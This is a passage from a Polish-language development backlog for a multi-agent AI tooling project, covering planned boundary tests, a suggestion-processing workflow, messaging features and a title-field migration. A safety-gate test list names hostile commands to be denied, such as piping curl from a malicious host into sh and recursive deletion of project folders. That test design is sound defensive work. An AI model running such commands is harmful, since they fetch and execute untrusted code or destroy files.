- **Brak testu:** Czy blokuje `rm documents/erp_specialist/PROMPT.md`? (Obecnie NIE)

## Rozwiązanie

**Dodaj testy integracyjne dla granic modułów:**

### Test Suite 1: Runner ↔ Repository

**test_claimed_status_read_failure:**
- Runner zapisuje message z `status = 'claimed'` (direct SQL)
- Repository próbuje odczytać message
- Assert: ValueError raised (claimed nie w MessageStatus enum)
- **Cel:** Verify architectural leak detected

**test_claimed_status_after_fix:**
- Runner zapisuje message z `claimed_by = 'runner-123'`, `status = 'unread'`
- Repository odczytuje message
- Assert: message.status = UNREAD, message.claimed_by = 'runner-123'
- **Cel:** Verify fix (separation of concerns)

### Test Suite 2: Telemetry Deduplication

**test_tool_call_live_and_replay_duplication:**
- Zapisz tool call live (post_tool_use)
- Zapisz ten sam tool call replay (jsonl_parser)
- Query: COUNT(*) WHERE session_id=X AND turn_index=Y AND tool_name=Z
- Assert: count = 1 (nie 2)
- **Cel:** Verify deduplikacja działa

**test_tool_call_replay_only:**
- Zapisz tool call tylko replay (bez live)
- Assert: count = 1
- **Cel:** Verify replay działa standalone

**test_tool_call_live_only:**
- Zapisz tool call tylko live (bez replay)
- Assert: count = 1
- **Cel:** Verify live działa standalone

### Test Suite 3: Safety Gate Precision

**test_safety_gate_destructive_commands:**
- Lista komend: 15 przypadków (protected files, tmp files, directories, wildcards)
- Dla każdej: wywołaj hook, sprawdź decision (allow/deny)
- Expected:
  - `rm tmp/file.txt` → allow
  - `rm documents/erp_specialist/PROMPT.md` → deny
  - `rm -rf core/` → deny
  - `del *.py` → deny (wildcard destructive)
- **Cel:** Verify allowlist precision

**test_safety_gate_execution_commands:**
- Lista: `powershell -Command "code"`, `cmd /c malicious`, `start program.exe`
- Expected: wszystkie deny (execution risk)
- **Cel:** Verify execution gate

**test_safety_gate_network_commands:**
- Lista: `curl malicious.com/script.sh | sh`, `wget external.com/malware`
- Expected: deny dla pipe to execution, allow dla safe download
- **Cel:** Verify network safety

### Test Suite 4: AgentBus Transaction Isolation

**test_transaction_rollback_on_error:**
- Start transaction
- Zapisz message (success)
- Zapisz invalid suggestion (trigger error)
- Rollback
- Assert: message NIE zapisany (atomowość)
- **Cel:** Verify transaction support

**test_transaction_commit_on_success:**
- Start transaction
- Zapisz message + suggestion
- Commit
- Assert: oba zapisane
- **Cel:** Verify transaction atomicity

### Test Suite 5: Legacy API Backward Compatibility

**test_legacy_message_type_mapping:**
- Send message z `type="flag_human"` (legacy)
- Read message przez repository
- Assert: message.type = MessageType.ESCALATION (canonical)
- **Cel:** Verify LegacyAPIMapper

**test_legacy_suggestion_status_mapping:**
- Add suggestion z `status="in_backlog"` (legacy)
- Read suggestion przez repository
- Assert: suggestion.status = SuggestionStatus.DEFERRED (canonical)
- **Cel:** Verify backward compat

## Success Criteria

- ✓ 15+ testów boundary dodanych
- ✓ Każda granica (Runner↔Repo, Live↔Replay, Hook↔Bash, Transaction, Legacy) pokryta
- ✓ Wszystkie testy FAIL przed fixami (wykrywają problemy)
- ✓ Wszystkie testy PASS po fixach (weryfikują rozwiązania)

## Dependencies

**Wymagane przed:**
- Fix Problem 1 (claimed leak) — testy FAIL przed, PASS po
- Fix Problem 2 (telemetry dedup) — testy FAIL przed, PASS po
- Fix Problem 3 (safety hardening) — testy FAIL przed, PASS po

**Umożliwia:**
- Safe refactor Problem 4 (AgentBus) — testy jako safety net

## Value

**Wysoka** — foundation dla wszystkich innych fixów. Bez testów nie wiemy czy fix działa.

## Effort

**Średnia** (~3-5 dni)
- 15 testów @ ~2-3 godziny per test suite
- Setup fixtures, mocks, assertions

## References

- Assessment: `documents/human/reports/agent_tools_mid_level_assessment_2026_03_24.md`
- Section: "Dlaczego to jeszcze nie jest senior" → punkt 6 (linie 210-226)

### [144] PE workflow obrabiania sugestii — extraction pattern
**area:** Prompt  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

PE workflow obrabiania sugestii — wykopywanie actionable items przed zamknięciem.

**Obserwacja z tej sesji:**

Developer zaproponował zamknięcie:
- Kategoria 1 (M1-M4): 19 sugestii jako `realized`
- Kategoria 2 (Session Init): 15 sugestii jako `realized`

**User wyciągnął z nich:**
- 6 sugestii M1-M4 → 5 backlog items (#131-#135)
- 9 sugestii Session Init → 8 backlog items (#136-#143) + 1 update (#127)

**Total: 13 nowych backlog items z 15 sugestii które miały być po prostu zamknięte.**

---

## Problem

**Obecne podejście (naiwne):**
1. Sugestia dotyczy zrealizowanego projektu (M1-M4, session_init)
2. Projekt complete → zamknij sugestię jako `realized`
3. **STRATA:** actionable items (lessons learned, patterns, rules) przepadają

**Pattern który user zastosował:**
1. Przeczytaj sugestię
2. **Zapytaj:** Czy to tylko obserwacja czy actionable item?
3. Jeśli actionable:
   - Extract konkretny task
   - Dodaj do backlogu (PE, Developer, Architect, Metodolog)
   - Zamknij sugestię jako `in_backlog` (nie `realized`)
4. Jeśli tylko obserwacja bez akcji:
   - Zamknij jako `realized` lub `noted`

---

## Wartość "wykopywania"

**Ta sesja — case study:**

**M1-M4 (6 sugestii → 5 backlog items):**
- #263: "Transferable Wisdom" → **2 backlog items** (#131 workflow arch, #132 methodology)
- #252 + #247: "ADR Quality" + "ADR timing" → #133 (ADR w promptach)
- #245: "Communication loop closure" → #134 (domykanie pętli)
- #206 + #199: "Test checkpoint" + "Success criteria" → #135 (test strategy)

**Session Init (9 sugestii → 8 backlog items + 1 update):**
- #264: "Config as source of truth" → #136 (PE wytyczne)
- #244: "TDD eliminuje założenia" → #137 (TDD w promptach)
- #243: "User feedback real-time" → #138 (feedback loop)
- #242: "Session-aware CLI security" → #127 update (security audit)
- #241: "Config-driven architecture" → #139 (arch audit całego projektu)
- #240: "Handoff pattern" → #140 (handoff message type)
- #234: "Broadcast messages" → #141 (agent_bus feature)
- #224: "Automation patterns" → #142 (audit procedur)
- #220: "Auto mark-read" → #143 (agent_bus feature)

**ROI:**
- Input: 15 sugestii do zamknięcia
- Output: 13 backlog items (wartość: 8 high + 5 medium priority)
- **Wartość uratowana:** Gdyby tylko zamknąć → 0 backlog items, 13 patterns przepadłoby

---

## Pattern "wykopywania" — jak zawrzeć w workflow

**Krok 1: Klasyfikacja sugestii**

Gdy przeglądasz sugestie do zamknięcia, zadaj pytania:

1. **Czy to lesson learned?**
   - "TDD eliminuje założenia" (#244) → TAK
   - Action: Dodaj do wytycznych ról

2. **Czy to pattern do wdrożenia?**
   - "Config-driven architecture" (#241) → TAK
   - Action: Arch audit całego projektu

3. **Czy to tool/feature do zbudowania?**
   - "Broadcast messages" (#234) → TAK
   - Action: Developer implementuje

4. **Czy to reguła dla ról?**
   - "Communication loop closure" (#245) → TAK
   - Action: Dodaj do DEVELOPER.md, ARCHITECT.md

5. **Czy to audit/research task?**
   - "Automation patterns" (#224) → TAK
   - Action: PE + Architect audit promptów

**Jeśli odpowiedź TAK na którekolwiek → extract backlog item.**

---

**Krok 2: Extraction pattern**

Dla każdej sugestii actionable:

1. **Identify owner:**
   - Lesson learned → PE (aktualizacja promptów)
   - Tool/feature → Developer (implementacja)
   - Architecture → Architect (audit/design)
   - Methodology → Metodolog (wytyczne)

2. **Formulate task:**
   - Nie kopiuj całej sugestii
   - Extract konkretny action item
   - Dodaj context (dlaczego, source)

3. **Estimate:**
   - Value: wysoka/średnia/mała (impact × frequency)
   - Effort: duża/średnia/mała (complexity × scope)

4. **Create backlog item:**
   - Title: konkretny (nie "obserwacja X")
   - Content: action + success criteria
   - Area: właściwa rola

5. **Update suggestion:**
   - Status: `in_backlog`
   - backlog_id: link do utworzonego item

---

**Krok 3: Grouping synergies**

User pattern:
- #252 + #247 → 1 backlog item (ADR w promptach)
- #206 + #199 → 1 backlog item (test strategy)

**Heurystyka:**
Jeśli 2+ sugestie dotyczą tego samego tematu → zgrupuj w 1 backlog item (avoid duplication).

---

## Workflow PE: Obrabianie sugestii (draft)

**Input:** Lista sugestii otwartych (status: open)

**Output:**
- Sugestie closed (realized/noted/rejected/in_backlog)
- Backlog items (extracted actionable)

---

### Faza 1: Grupowanie (jak w tej sesji)

1. **Group by project/feature:**
   - M1-M4 Migration
   - Session Init
   - Tool X
   - Feature Y

2. **Group by type:**
   - Observations
   - Rules
   - Discoveries
   - Tool proposals

3. **Identify clusters:**
   - Który projekt complete? (candidate do zamknięcia)
   - Które sugestie dotyczą tego samego tematu? (candidate do grouping)

---

### Faza 2: Extraction (user pattern)

**Dla każdej grupy:**

1. **Przeczytaj wszystkie sugestie w grupie**
   - Nie tylko tytuły — full content
   - Look for: lessons learned, patterns, rules, features

2. **Classify każdą sugestię:**
   - [ ] Pure observation (noted/realized)
   - [ ] Lesson learned (extract → PE task)
   - [ ] Pattern to implement (extract → Dev/Arch task)
   - [ ] Rule for roles (extract → PE update prompts)
   - [ ] Tool/feature (extract → Dev backlog)
   - [ ] Audit/research (extract → Arch/PE task)

3. **Extract actionable items:**
   - Create backlog items (concrete, assignable)
   - Link sugestie → backlog (in_backlog status)

4. **Close non-actionable:**
   - Pure observations → `noted`
   - Project complete observations → `realized`

---

### Faza 3: Verification (quality gate)

**Before bulk close:**

1. **Question:** Czy coś ważnego przepada?
   - Re-read titles (quick scan)
   - High-value suggestions (author=architect, type=rule) → double check

2. **Pattern check:**
   - Ile sugestii → backlog items?
   - Jeśli ratio < 10% → czy na pewno wszystko extracted? (red flag)
   - Jeśli ratio > 30% → dobry znak (value harvested)

3. **Stakeholder review (optional):**
   - Gdy grupa duża (>20 sugestii) → ask user
   - "Zamykam X sugestii, extracted Y backlog items — review?"

---

### Faza 4: Execution

1. **Bulk close:**
   - `suggest-status-bulk` dla każdej kategorii
   - realized/noted/in_backlog

2. **Report:**
   - Statystyki (zamknięte vs extracted)
   - Backlog items created (lista z IDs)
   - Remaining open (do następnej rundy)

---

## Success criteria dla workflow

**PE po wdrożeniu workflow powinien:**

1. **Extract value:**
   - >10% sugestii zamykanych → backlog items (nie pure close)
   - High-value suggestions nigdy nie closed bez extraction

2. **Avoid waste:**
   - Lessons learned nie przepadają (extracted → prompts/methodology)
   - Patterns nie tracone (extracted → backlog)

3. **Efficient processing:**
   - Batch processing (grouping saves time)
   - Clear criteria (classification questions)

4. **Traceability:**
   - Sugestia in_backlog → backlog_id link
   - Backlog item → source suggestion ID w content

---

## User question: "Jak zawrzeć moje myślenie?"

**Odpowiedź:**

Twoje myślenie = **pytania klasyfikacyjne** + **extraction pattern**.

**W workflow:**

1. **Pytania klasyfikacyjne (Faza 2.2):**
   - Czy to lesson learned?
   - Czy to pattern do wdrożenia?
   - Czy to tool/feature?
   - Czy to reguła dla ról?
   - Czy to audit/research?

   **Te pytania wymuszają "wykopywanie" — nie pozwalają na naiwne "close as realized".**

2. **Extraction pattern (Faza 2.3):**
   - Identify owner (PE/Dev/Arch/Metodolog)
   - Formulate task (konkretny action)
   - Estimate (value/effort)
   - Create backlog item

   **Ten pattern przekłada obserwację na executable task.**

3. **Quality gate (Faza 3.2):**
   - Ratio check (<10% extracted = red flag)
   - Forces re-review gdy too few extracted

   **Safety net — zapobiega masowemu close bez extraction.**

---

## Implementation plan

**PE task:**

1. Stworzyć plik: `documents/prompt_engineer/SUGGESTIONS_WORKFLOW.md`
   - Fazy 1-4 (grouping, extraction, verification, execution)
   - Pytania klasyfikacyjne (checklist)
   - Extraction pattern (template)

2. Dodać do `PROMPT_ENGINEER.md` reminder:
   > **Suggestions processing:**
   > Używaj workflow: `documents/prompt_engineer/SUGGESTIONS_WORKFLOW.md`
   > Nie zamykaj sugestii bez extraction check (Faza 2.2)

3. Test run:
   - Następna runda suggestions cleanup
   - Apply workflow
   - Measure: ratio extracted (target >10%)

**Success criteria:**
- SUGGESTIONS_WORKFLOW.md exists
- PE stosuje workflow (następna runda)
- Ratio extracted >10% (value harvested)

---

**Source:** Sesja 2026-03-24 (Developer obrabiał sugestie z user guidance)
**ROI tej sesji:** 15 sugestii → 13 backlog items (87% extraction rate)
**Pattern validated:** Extraction workflow > naive close

### [143] Agent_bus — auto mark-read + manual unread
**area:** Dev  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Agent_bus — auto mark-read przy odpowiedzi + manual unread capability.

**Problem:**
Agenci nie markują wiadomości jako read nawet gdy odpowiadają. Przeładowuje context window w kolejnych sesjach.

**Now we have message titles:**
Można markować jako read gdy agent podniósł wiadomość (content), nie tylko tytuł.

**Task:**

1. **Auto mark-read przy odpowiedzi:**
   - Gdy agent wywołuje `send` w odpowiedzi na message X → auto mark X as read
   - Detection: `--ref <message_id>` parameter?
   - Behavior: atomically send + mark-read parent

2. **Manual mark-read/unread:**
   - `mark-read --id <msg_id>` (już istnieje?)
   - `mark-unread --id <msg_id>` (nowe)
   - Use case: Agent przeczytał, ale chce wrócić później

3. **Inbox filtering enhancement:**
   - `inbox --status unread` (już istnieje)
   - `inbox --status read` (nowe)
   - `inbox --status all` (nowe)

**Success criteria:**
- Auto mark-read działa
- Manual mark-unread dostępne
- Inbox filtering po statusie
- Test: Agent odpowiada → następna sesja nie pokazuje jako unread

**Source:** Sugestia #220

### [142] Audit promptów/workflow — procedury do automatyzacji
**area:** Prompt  **value:** wysoka  **effort:** duza  **status:** planned  **created_at:** 2026-03-24

Audit promptów/workflow — procedury do automatyzacji.

**Observation:**
Wiele kroków w workflow to procedury które można zautomatyzować:
- Sprawdź backlog → tool zwraca dane
- Sprawdź inbox → tool zwraca dane
- Sprawdź logi → tool zwraca dane

**Zasada:** Jeśli agent nie musi myśleć (tylko wykonać procedurę) — zautomatyzuj to.

**Task dla PE:**
Przejrzyj wytyczne ról pod kątem kroków proceduralnych:
1. Identyfikuj: "Sprawdź X" / "Wylistuj Y" / "Przejrzyj Z"
2. Oceń: Czy agent musi myśleć? Czy to procedura?
3. Jeśli procedura → propozycja automatyzacji

**Task dla Architect:**
Szukaj patterns w promptach do automatyzacji:
1. Grep: "Sprawdź|Wylistuj|Przejrzyj|Wykonaj komendę"
2. Kategoryzuj: procedury (automate) vs decyzje (keep manual)
3. Priorytetyzuj: high frequency + low thinking = top priority
4. Deliverable: raport automation_candidates_YYYY_MM_DD.md

**Success criteria:**
- PE: lista procedur z promptów
- Architect: raport z automation candidates
- Backlog items: top 5 automation opportunities

**Source:** Sugestia #224

### [141] Agent communication — broadcast messages (do wszystkich)
**area:** Dev  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Agent communication — możliwość broadcast messages (wysyłanie do wszystkich ról naraz).

**Problem:**
PE notyfikuje wszystkie role o zmianach promptów — brak mechanizmu broadcast (musi wysyłać do każdej roli ręcznie).

**Task dla Developer:**
1. Sprawdzić czy możliwe `agent_bus_cli.py send --to all`?
2. Jeśli nie → implementacja:
   - `send --to all --content-file tmp/x.md`
   - Creates N messages (one per role) atomically
   - Exclude: sender nie dostaje swojej własnej wiadomości

**Task dla PE (po wdrożeniu):**
Dodaj do end_of_turn_checklist:
"Jeśli modyfikowałem prompty ról — wysłałem notyfikację broadcast?"

**Success criteria:**
- `send --to all` działa (lub backlog item)
- PE checklist zawiera broadcast notification reminder
- Test: PE zmienia 3 prompty → broadcast → 3 role dostają notification

**Source:** Sugestia #234

### [140] Handoff pattern — message type + zobowiązanie ról
**area:** Prompt  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Handoff pattern — message type + zobowiązanie ról do wysyłania przy zamykaniu sesji w trakcie procesu.

**Pattern observed:**
Sesja urwała się (context overflow) → handoff file → następna sesja kontynuuje.

**Task dla PE:**
1. Sprawdzić czy mamy typ wiadomości `handoff` w MessageType enum
2. Aktualizować prompty ról o zobowiązanie handoff:
   - Zapisz handoff file przy przerwaniu sesji
   - Wyślij wiadomość typu handoff do siebie
   - Log sesji: zanotuj gdzie praca została przerwana

**Task dla Developer:**
1. Sprawdzić czy MessageType ma `handoff`
2. Jeśli nie → dodać do enuma i migration

**Success criteria:**
- MessageType ma `handoff` (lub task w backlogu)
- Prompty ról zawierają handoff pattern
- Test: Sesja przerwana → handoff file + message + log

**Source:** Sugestia #240

### [139] Architect audit — config-driven architecture w całym projekcie
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Architect wykonuje audit całego projektu pod kątem hardcoded values do przeniesienia do config.

**Z session_init:**
Przed: 6 promptów z hardcoded limitami
Po: 1 plik JSON config kontroluje wszystkie role

**Task:**
Architect audytuje:
1. Prompty (documents/*/*.md) — limity, ścieżki, parametry
2. Narzędzia (tools/*.py) — ścieżki, prompty, konfiguracja
3. Workflow (workflows/*.md) — parametry, thresholdy

**Deliverable:**
- Raport: lista hardcoded values do przeniesienia
- Propozycja architektury: gdzie trzymać configs
- Plan implementacji: priorytetyzacja

**Success criteria:**
- Raport w documents/human/reports/config_driven_audit_YYYY_MM_DD.md
- Architect wysyła propozycję do PE i Developer
- Backlog items dla top priorities

**Source:** Sugestia #241

### [138] Wytyczne Developer/Architect — user feedback loop real-time
**area:** Prompt  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Dodać do wytycznych Developer, Architect: User feedback loop real-time > strict adherence to spec.

**Pattern observed:**
- Developer zaproponował rozwiązanie
- User skorygował real-time: "Opcja 2 ale też inbox/backlog/flags"
- Developer rozszerzył scope natychmiast
- Końcowy produkt > pierwotny request

**Lesson:**
Traktuj specs jako punkt startu, nie kontrakt. User feedback > pierwotna specyfikacja.
But: Zawsze pytaj/proponuj zanim rozszerzysz scope (nie zgaduj).

**Action:**
- Dodać do DEVELOPER.md sekcję "User feedback integration"
- Dodać do ARCHITECT.md podobną zasadę (architecture proposals)

**Success criteria:**
- Zasada w DEVELOPER.md i ARCHITECT.md
- Pattern visible w następnych implementacjach

**Source:** Sugestia #243

### [137] Wytyczne PE/Developer — TDD eliminuje założenia o API
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Dodać do wytycznych PE i Developer obserwację: TDD eliminuje założenia o API.

**Pattern observed (session_init implementation):**
- Developer napisał kod, potem testy
- Testy failowały: założył API signature bez sprawdzenia kodu źródłowego
- Gdyby użył TDD: test fail → sprawdzam kod → dostosowuję test → piszę impl → pass

**Lesson:** TDD eliminuje założenia — zmusza do verification przed kodem.

**Action:**
- Dodać do DEVELOPER.md critical_rules: "TDD > Test-after > No tests"
- Dodać do PROMPT_ENGINEER.md jako pattern do promowania w promptach ról

**Success criteria:**
- Wytyczna w DEVELOPER.md
- PE awareness (następna aktualizacja promptów)

**Source:** Sugestia #244

### [136] PE wytyczne — config as source of truth
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Dodać do wytycznych PE zasadę "config as source of truth".

**Zasada:**
Gdy wprowadzasz nowy mechanizm z zewnętrznym configiem, nie powielaj struktury configu w promptach. Prompt powinien referencować ("dostępne w context"), nie definiować szczegółów.

**Uzasadnienie:**
- Single source of truth (config)
- Edycja config nie wymaga edycji promptów
- Shorter prompts (compression 56% w sesji #229)

**Example:**
- WRONG: "context.inbox — wiadomości (limit 10, status unread)"
- RIGHT: "Kontekst załadowany w context (inbox, backlog, session_logs, flags_human)."

**Action:**
Dodać do PROMPT_ENGINEER.md lub PROMPT_CONVENTION.md sekcję "Config-driven prompts" z przykładami.

**Success criteria:**
- Zasada udokumentowana
- PE stosuje przy następnej edycji promptów z config

**Source:** Sugestia #264 (session_init context)

### [135] Test strategy w workflow — checkpoint + success criteria
**area:** Prompt  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Dodać do workflow developera (i architekta) sekcję "Test Strategy".

**Pattern 1: Test checkpoint (z M1-M4 #206)**

Evidence z M3:
- 4/9 bugs caught by test checkpoint (AttributeError, status mapping, reverse mapping)
- 1/9 bugs caught by code review
- Test checkpoint **po każdej metodzie** = bug scope lokalny (fast fix)

**Pattern 2: Success criteria completeness (z M1-M4 #199)**

Gap w M3 Phase 1 success criteria:
- "Testy agent_bus pass" (vague) ✗
- Developer sprawdził tylko suggestion-specific tests (10/10 PASS)
- Transaction tests (5 tests) zostały pominięte
- Bug discovered in code review (not checkpoint)

**Action — dodać do workflow:**

1. **Test checkpoint pattern:**
   - Run tests **po każdej metodzie** (not after entire phase)
   - Scope: all tests that touch modified code (nie tylko nowe)
   - Evidence: "X/Y tests PASS" (explicit count)

2. **Success criteria completeness:**
   - Lista testów do sprawdzenia (explicit test files/functions)
   - Nie: "testy pass" (vague) ✗
   - Tak: "test_agent_bus.py::TestSuggestions + test_repositories.py::TestSuggestionRepo PASS" ✓

3. **Test coverage verification:**
   - Gdy dodajesz funkcjonalność X, sprawdź czy istniejące testy X też passują
   - Nie zakładaj "nowe testy = wystarczające"

**Target files:**
- workflows/developer_workflow.md — sekcja "Testing"
- documents/architect/ARCHITECT.md — code review checklist

**Success criteria:**
- Workflow zawiera test checkpoint pattern
- Success criteria template: explicit test list
- Test: Zadanie implementacyjne → developer wymienia explicit testy

**Source:** Sugestie #206 (Test checkpoint) + #199 (Success criteria completeness)

### [134] Communication loop closure pattern dla agentów
**area:** Prompt  **value:** srednia  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Dodać do promptów ról zasadę domykania pętli komunikacyjnych.

**Problem caught by user (M1-M4):**
- Architect: GREEN LIGHT conditional (wymagane ADR-001)
- Developer: zrealizował (ADR-001 + merge complete)
- Developer: **nie wysłał potwierdzenia** do architekta ✗
- User: "Co? Wysłąłeś wiadomość do architekta?"

**Correct pattern:**
Request → Approval (conditional) → Action → **Confirmation** (closes loop)

**Broken pattern:**
Request → Approval (conditional) → Action → [missing Confirmation] ✗

**Why this matters:**
Conditional approval = two-way contract. Missing confirmation = approver nie wie czy warunki spełnione.

**Action:**
Dodać do promptów (Developer, Architect) zasadę:

> **Communication loop closure:**
> Po zakończeniu warunkowego zadania, wyślij potwierdzenie z evidence:
> - Status: completed
> - Evidence: tests PASS, pushed, deliverables
> - Ref: original request ID

**Target prompts:**
- DEVELOPER.md
- ARCHITECT.md
- Opcjonalnie: CLAUDE.md (reguła wspólna)

**Success criteria:**
- Reguła w promptach ról
- Test: Zadanie warunkowe → agent wysyła confirmation po ukończeniu

**Source:** Sugestia #245 (Communication loop closure — critical pattern)

### [133] Architect prompt — ADR best practices verification
**area:** Prompt  **value:** srednia  **effort:** mala  **status:** planned  **created_at:** 2026-03-24

Sprawdzić czy prompt architekta zawiera instrukcje dotyczące ADR.

**Pytania weryfikacyjne:**
1. Czy architect wie że ADR jest częścią "done" (jak testy)?
2. Czy architect tworzy ADR podczas/po implementacji (nie miesiące później)?
3. Czy architect wie co dokumentować w ADR (context, decision, consequences, lessons)?
4. Czy architect wie że ADR to "preservation of architectural intelligence" (nie optional docs)?

**Z M1-M4 lessons:**
- ADR = part of "done" (like tests), not optional docs
- Write during/after implementation, not months later
- ADR preserves: decision context, trade-off rationale, lessons learned

**Action:**
- Przejrzeć ARCHITECT.md
- Jeśli brak → dodać sekcję ADR best practices
- Jeśli jest → zweryfikować completeness (timing, content, status)

**Success criteria:**
- Architect prompt zawiera ADR guidelines
- ADR timing explicite: "before merge" / "part of done"
- ADR structure documented: context, decision, consequences, lessons

**Source:** Sugestie #252 (ADR-001 Quality) + #247 (ADR timing)

### [132] METHODOLOGY.md — migration best practices z M1-M4
**area:** Metodolog  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Dodać do METHODOLOGY.md sekcję "Migration Best Practices" z lessons learned z M1-M4.

**Key lessons:**
- Golden windows recognition (complexity low = act now)
- Incremental migration > big bang (confidence at every step)
- Backward compatibility as architectural constraint (breeds better design)
- Proactive discovery > reactive fix (audit before constraints)
- Documentation timing (ADR when context fresh, not months later)

**Context:**
M1-M4 pokazał complete methodology dla production-grade migrations. Pattern reusable dla:
- State management migration (future)
- Authentication refactor (if needed)
- Any dict-based system → typed entities

**Success criteria:**
- Sekcja w METHODOLOGY.md z 5-7 key lessons
- Metodolog referencuje patterns w code review
- Test: "oceń plan migracji" → metodolog sprawdza zgodność z M1-M4 patterns

**Source:** Sugestia #263 (M1-M4 Transferable Wisdom)

### [131] Workflow Architekta — 10 transferable patterns z M1-M4
**area:** Prompt  **value:** wysoka  **effort:** srednia  **status:** planned  **created_at:** 2026-03-24

Wdrożyć 10 transferable patterns z M1-M4 Migration do workflow architekta:

1. Recognize golden windows — act fast when complexity low
2. Document decisions — ADR preserves intelligence
3. Incremental > big bang — confidence at every step
4. Proactive discovery — audit before commit
5. Backward compat as constraint — breeds better architecture
6. Fail-fast at all layers — defense in depth
7. Tight feedback loops — accelerate learning
8. Strategic user involvement — scarce resource
9. Preserve context in artifacts — memory fades
10. Technical debt has compound interest — pay early

**Akcja:**
- Dodać do ARCHITECT.md sekcję z tymi patterns
- Lub stworzyć MIGRATION_PATTERNS.md jako reference
- Uwzględnić w workflow gdy architect planuje duży refactor

**Success criteria:**
- Patterns dokumentowane w reachable location
- Architect prompt referencuje patterns
- Test: "zaplanuj migrację X" → architect wymienia relevant patterns

**Source:** Sugestia #263 (M1-M4 Transferable Wisdom)

### [130] Message.title: extract z markdown header (context optimization)
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-24

# Backlog: Message.title — Extract Title z Markdown Header

## Problem

**Context overload w session_init:**
- Messages mają tylko `content` (2000+ znaków)
- session_init ładuje full content wszystkich unread messages
- Context window palony na szczegóły których agent nie potrzebuje na starcie
- Inbox listing ciężki (brak quick scan)

**Inconsistency:**
- Suggestion ma `title` (krótki) + `content` (szczegóły)
- BacklogItem ma `title` + `content`
- Message ma tylko `content` (nagłówek markdown wewnątrz)

## Rozwiązanie

**Dodaj pole `title` do Message + transparent extraction z markdown header:**

1. **Schema migration:** ADD COLUMN `title TEXT NOT NULL DEFAULT ''`
2. **Data migration:** Extract title z istniejących messages (parsing `# Header` z content)
3. **Entity update:** `Message.title: str = ""`
4. **AgentBus logic:** `_extract_title_from_markdown(content) -> (title, body)`
5. **session_init optimization:** Load tylko titles (nie full content) dla inbox preview

**Backward compatibility:**
- Agent API nie zmienia się — dalej pisze `content="# Title\n\nBody"`
- AgentBus transparent extraction: split na title + body before save
- Zero breaking changes

## Benefit

**Context savings:**
- Before: 2 messages × 2000 chars = 4000 chars
- After: 2 messages × 50 chars (title only) = 100 chars
- **Savings: ~95% context window w session_init**

**Spójność:**
- Message/Suggestion/Backlog wszystkie mają title
- Pattern jednolity: title = preview, content = szczegóły

**UX:**
- Inbox quick scan (titles only)
- Content on demand (gdy agent faktycznie czyta message)

## Implementacja

**M5.1: Schema Migration**
```sql
ALTER TABLE messages ADD COLUMN title TEXT NOT NULL DEFAULT '';

-- Extract title z content (existing messages)
UPDATE messages SET title =
  CASE
    WHEN content LIKE '# %' THEN SUBSTR(content, 3, INSTR(SUBSTR(content, 3), CHAR(10)) - 1)
    WHEN content LIKE '## %' THEN SUBSTR(content, 4, INSTR(SUBSTR(content, 4), CHAR(10)) - 1)
    ELSE sender || ' → ' || recipient
  END
WHERE title = '';

-- Remove header line z content
UPDATE messages SET content =
  SUBSTR(content, INSTR(content, CHAR(10)) + 2)
WHERE content LIKE '# %' OR content LIKE '## %';
```

**M5.2: Entity Update**
```python
# core/entities/messaging.py
@dataclass
class Message(Entity):
    sender: str
    recipient: str
    content: str
    title: str = ""  # ← NEW
    # ... rest unchanged
```

**M5.3: Repository Update**
```python
# core/repositories/message_repo.py
def _row_to_entity(self, row) -> Message:
    return Message(..., title=row["title"], ...)

def _entity_to_row(self, entity) -> dict:
    return {..., "title": entity.title, ...}
```

**M5.4: AgentBus Extraction Logic**
```python
# tools/lib/agent_bus.py
def _extract_title_from_markdown(content: str) -> tuple[str, str]:
    """Extract title z markdown header, return (title, body)."""
    lines = content.split('\n', 1)
    first_line = lines[0].strip()

    if first_line.startswith('#'):
        title = first_line.lstrip('#').strip()
        body = lines[1].strip() if len(lines) > 1 else ""
        return title, body

    return "", content

def send_message(self, sender, recipient, content, ...):
    # Extract title (transparent dla agent)
    title, body = _extract_title_from_markdown(content)

    message = Message(
        sender=sender,
        recipient=recipient,
        title=title,      # ← extracted
        content=body,     # ← without header
        ...
    )
    repo.save(message)
```

**M5.5: session_init Optimization**
```python
# tools/session_init.py
def get_inbox_context(role: str) -> dict:
    messages = bus.get_inbox(role=role, status="unread")

    # Load tylko titles (nie full content)
    inbox_preview = [
        {"id": m["id"], "sender": m["sender"], "title": m["title"], "type": m["type"]}
        for m in messages
    ]

    return {"messages": inbox_preview, "count": len(inbox_preview)}
```

## Tests

1. `test_extract_title_from_markdown()` — parsing logic
2. `test_send_message_extracts_title()` — transparent extraction
3. `test_migration_m5_data_quality()` — verify extracted titles
4. `test_session_init_lightweight()` — tylko titles w inbox, nie content
5. `test_backward_compat()` — agent API unchanged

## Success Criteria

- ✓ Schema: `messages.title` column added
- ✓ Data: All existing messages have title (extracted or fallback)
- ✓ Entity: `Message.title` field
- ✓ Logic: AgentBus transparent extraction works
- ✓ session_init: Load titles only (95%+ context savings)
- ✓ Tests: 100% PASS (backward compat verified)
- ✓ Zero breaking changes

## References

- Architect session 2026-03-24: Code walkthrough M1-M4 (#128)
- ADR-001: Domain Model Migration (M1-M4)
- Pattern: Title extraction inspirowane Suggestion/BacklogItem design

### [129] Przegląd kodu M1-M4 - zobaczyć na własne oczy
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** planned  **created_at:** 2026-03-23

# Backlog: Przegląd kodu M1-M4 (User exploration)

## Cel

Przejrzeć na własne oczy kod M1-M4 — zobaczyć co konkretnie zostało zbudowane.

## Scope

**Self-guided exploration lub z Architect:**

1. **Domain Model (M1):**
   - Gdzie są entities? (`core/entities/messaging.py`)
   - Jak wygląda Message, Suggestion, Backlog?
   - Co to znaczy "frozen dataclass"?

2. **Repositories (M2):**
